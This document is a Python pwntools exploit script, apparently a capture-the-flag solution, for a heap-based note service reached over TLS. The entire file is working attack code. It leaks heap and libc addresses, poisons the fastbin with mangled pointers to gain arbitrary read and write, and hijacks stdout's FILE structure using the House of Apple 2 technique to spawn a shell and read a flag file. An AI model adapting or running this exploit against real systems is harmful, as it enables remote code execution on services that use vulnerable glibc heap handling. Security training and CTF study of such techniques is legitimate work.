#!/usr/bin/env python3
import sys
from pwn import *
import ssl

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
context.arch = 'amd64'
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443

MAIN_ARENA = 0x204AC0
HEAP_META = 0x2A0
HEAP_A = 0x430
HEAP_C1 = 0x470
HEAP_S = 0xD40
NOTES = HEAP_META

libc = ELF('./libc.so.6', checksec=False)


def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr


def add(io, idx, size, data):
    data = bytes(data).ljust(size, b'\x00')
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'[+] added\n')


def do_view(io, idx, size):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())
    data = io.recvn(size)
    io.recvuntil(b'[+] done\n')
    return data


def edit(io, idx, data, size=None):
    if size is not None:
        data = bytes(data).ljust(size, b'\x00')
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'[+] edited\n')


def dele(io, idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.recvuntil(b'[+] deleted\n')


def main():
    io = remote(HOST, PORT, ssl=True, sni=HOST)

    add(io, 0, 0x48, b'A' * 8)
    add(io, 1, 0x418, b'C1' * 8)
    add(io, 2, 0x50, b'K' * 8)
    add(io, 3, 0x418, b'C2' * 8)
    add(io, 4, 0x18, b'G' * 8)
    add(io, 5, 0x400, b'S' * 8)

    log.info('step 1: unsorted bin leaks (no tcache)')
    dele(io, 1)
    dele(io, 3)
    data = do_view(io, 3, 0x418)
    fd, bk = u64(data[:8]), u64(data[8:16])
    heap = fd - HEAP_C1
    libc.address = bk - 0x60 - MAIN_ARENA
    assert heap & 0xFFF == 0, hex(heap)
    assert libc.address & 0xFFF == 0, hex(libc.address)
    log.success('heap base:  %#x', heap)
    log.success('libc base:  %#x', libc.address)

    log.info('step 2: fastbin poisoning -> fake chunk inside notes[]')
    notes2 = heap + NOTES + 0x30
    a_data = heap + HEAP_A
    assert notes2 & 0xF == 0
    dele(io, 0)
    edit(io, 0, p64(protect_ptr(a_data, notes2)), size=0x48)

    add(io, 6, 0x48, b'J' * 8)

    log.info('step 3: forge notes[3] -> arbitrary R/W')
    payload = flat(
        p64(1),
        p64(libc.sym['_IO_2_1_stdout_']),
        p64(0xE0),
        p32(1), p32(0),
        p64(heap + 0xD20),
        p64(0x18),
        p32(1), p32(0),
        p64(heap + HEAP_S),
        p64(0x400),
    )
    assert len(payload) == 0x48
    add(io, 7, 0x48, payload)

    orig = do_view(io, 3, 0xE0)
    log.info('stdout FILE: %s', hexdump(orig[:0x30]))

    log.info('step 4: House of Apple 2')
    wide = heap + HEAP_S
    wvt = wide + 0x100
    scratch = bytearray(0x400)
    scratch[0xE0:0xE8] = p64(wvt)
    scratch[0x100 + 0x68:0x100 + 0x70] = p64(libc.sym['system'])
    edit(io, 5, bytes(scratch))

    fake = bytearray(orig)
    fake[0x00:0x08] = b'  sh;\x00\x00\x00'
    fake[0x20:0x28] = p64(0)
    fake[0x28:0x30] = p64(1)
    fake[0xA0:0xA8] = p64(wide)
    fake[0xD8:0xE0] = p64(libc.sym['_IO_wfile_jumps'])
    edit(io, 3, bytes(fake))

    log.info('step 5: exit -> _IO_flush_all -> system("  sh;")')
    io.sendlineafter(b'> ', b'5')
    io.sendline(b'echo PWNED; cat /flag.txt')
    io.recvuntil(b'PWNED\n')
    flag = io.recvline().strip().decode()
    log.success('flag: %s', flag)


if __name__ == '__main__':
    main()
